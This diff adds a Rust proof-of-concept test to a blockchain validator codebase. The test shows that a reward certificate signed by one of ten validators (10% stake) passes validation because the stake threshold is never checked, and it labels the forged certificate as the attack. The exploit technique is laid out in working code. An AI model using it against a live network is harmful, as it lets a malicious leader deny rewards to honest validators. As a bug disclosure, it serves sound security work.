@@ -305,4 +305,100 @@ mod tests {
         .unwrap();
         assert_eq!(validated_reward_cert.validators.len(), num_validators);
     }
+
+    /// POC: Reward cert signed by only 1/10 validators (10% stake) is accepted
+    /// because ValidatedRewardCert::try_new never calls verify_stake().
+    #[test]
+    fn poc_reward_cert_accepted_below_stake_threshold() {
+        let num_validators = 10;
+        let per_validator_stake = 100u64;
+
+        let validator_keypairs: Vec<ValidatorVoteKeypairs> = (0..num_validators)
+            .map(|_| ValidatorVoteKeypairs::new_rand())
+            .collect();
+        let shred_version = rand::rng().random();
+
+        let keypair_map: HashMap<_, _> = validator_keypairs
+            .iter()
+            .map(|k| {
+                (
+                    BLSPubkeyCompressed::from(*k.bls_keypair.public),
+                    k.bls_keypair.clone(),
+                )
+            })
+            .collect();
+
+        let genesis = create_genesis_config_with_alpenglow_vote_accounts(
+            1_000_000_000,
+            &validator_keypairs,
+            vec![per_validator_stake; num_validators],
+        );
+        let reward_slot = 1;
+        let bank_slot = reward_slot + NUM_SLOTS_FOR_REWARD;
+        let (bank, _bank_forks) =
+            Bank::new_for_tests(&genesis.genesis_config).wrap_with_bank_forks_for_tests();
+        let bank = Bank::new_from_parent(bank, SlotLeader::default(), bank_slot);
+
+        let rank_map = bank
+            .epoch_stakes_from_slot(reward_slot)
+            .unwrap()
+            .bls_pubkey_to_rank_map();
+
+        let signing_keys: Vec<&BlsKeypair> = (0..num_validators)
+            .map(|rank| {
+                let pubkey_affine = rank_map.get_pubkey_stake_entry(rank).unwrap().bls_pubkey;
+                keypair_map
+                    .get(&BLSPubkeyCompressed::from(*pubkey_affine))
+                    .unwrap()
+            })
+            .collect();
+
+        let block_id = Hash::new_unique();
+
+        // ATTACK: Build notar reward cert signed by ONLY rank 0 (10% stake)
+        let notar_vote = Vote::new_notarization_vote(Block {
+            slot: reward_slot,
+            block_id,
+        });
+        let (malicious_signature, malicious_bitmap) = build_sig_bitmap(
+            &(0..1)
+                .map(|rank| new_vote_msg(notar_vote, rank, signing_keys[rank], shred_version))
+                .collect::<Vec<_>>(),
+        );
+        let malicious_reward_cert =
+            NotarRewardCertificate::try_new(reward_slot, block_id, malicious_signature, malicious_bitmap)
+                .unwrap();
+
+        // THE BUG: try_new accepts this cert despite only 10% stake
+        let validated = ValidatedRewardCert::try_new(
+            &bank,
+            shred_version,
+            &None,
+            &Some(malicious_reward_cert),
+        )
+        .unwrap()   // <-- NO ERROR: should have failed with NotEnoughStake
+        .unwrap();  // <-- Some(cert): cert was accepted
+
+        // Only 1 validator in the reward set — the malicious leader
+        assert_eq!(
+            validated.validators().len(),
+            1,
+            "BUG: reward cert signed by 1/10 validators (10% stake) was accepted"
+        );
+
+        // Show that 10% < 60% threshold
+        let total_stake = rank_map.total_stake();
+        let signer_stake = rank_map.get_pubkey_stake_entry(0).unwrap().stake;
+        eprintln!(
+            "BUG CONFIRMED: Reward cert with {}/{} = {}% stake accepted (required: 60%)",
+            signer_stake.get(),
+            total_stake.get(),
+            signer_stake.get() * 100 / total_stake.get(),
+        );
+        eprintln!(
+            "Only {} validator in reward set; {} validators denied rewards",
+            validated.validators().len(),
+            num_validators - validated.validators().len(),
+        );
+    }
 }
